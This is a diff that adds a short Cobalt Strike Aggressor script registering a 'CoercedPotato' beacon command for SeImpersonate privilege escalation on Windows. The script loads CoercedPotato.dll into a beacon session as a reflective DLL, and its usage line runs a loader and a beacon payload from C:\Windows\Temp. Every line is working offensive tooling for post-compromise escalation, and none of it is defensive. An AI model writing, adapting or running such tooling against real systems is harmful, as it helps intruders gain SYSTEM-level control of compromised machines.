@@ -1,0 +1,16 @@
+beacon_command_register("CoercedPotato", "SeImpersonate Privilege Escalation",
+   "Exploit Usage: CoercedPotato spawn C:\Windows\Temp\loader.exe C:\Windows\Temp\beacon.bin\n");
+
+
+alias CoercedPotato {
+   local('$bid', '$args');
+   $bid = $1;
+   $args = substr($0, 14);
+
+   if ($args eq "") {
+      berror($bid, "Please specify an argument string");
+		return;
+   }
+   blog($bid, "Spawn CoercedPotato as a Reflective DLL\n");
+   bdllspawn($bid, script_resource("CoercedPotato.dll"), $args, "CoercedPotato", 5000, false);
+}
